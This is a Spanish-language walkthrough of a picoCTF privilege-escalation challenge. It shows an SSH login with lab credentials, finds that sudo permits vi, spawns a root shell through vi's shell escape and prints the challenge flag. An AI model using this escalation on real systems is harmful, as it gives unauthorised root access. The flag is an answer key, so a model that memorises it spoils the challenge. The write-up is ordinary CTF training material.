#### Description

Can you read files in the root file?
Additional details will be available after launching your challenge instance.

### **Solución**

1. **Conectarse al servidor mediante SSH**  
    Ejecutamos el siguiente comando para conectarnos al servidor con las credenciales proporcionadas:
    `ssh -p 63199 picoplayer@saturn.picoctf.net`
    
    Ingresamos la contraseña:
    `33qE7mB5BF`
    
2. **Explorar el sistema de archivos**
    
    - Listamos los archivos y directorios en la raíz (`/`):
        `ls -l /`
        
    - Observamos que el directorio `/challenge` está bloqueado (`d---------`), por lo que no podemos acceder a él.
    - Intentamos acceder a `/root`, pero nos encontramos con un **"Permission denied"**.
3. **Verificar permisos `sudo`**
    
    - Ejecutamos:
        `sudo -l`
        
    - Descubrimos que el usuario puede ejecutar `vi` como root:
        `User picoplayer may run the following commands on challenge: (ALL) /usr/bin/vi`
        
4. **Escalar privilegios con `vi`**
    
    - Abrimos `vi` con permisos de superusuario:
        `sudo vi -c ':!/bin/sh' /dev/null`
        
    - Esto nos da acceso a una **shell como root**.
5. **Acceder al directorio `/root` y leer la bandera**
    
    - Listamos los archivos dentro de `/root`:
        `ls -la /root`
        
    - Encontramos `.flag.txt`.
    - Lo leemos con:
        `cat /root/.flag.txt`
        
**Respuesta en el formato del concurso:**
`picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}`

**Referencias**
- Escalada de privilegios mediante editores de texto (`vi` y `vim`).
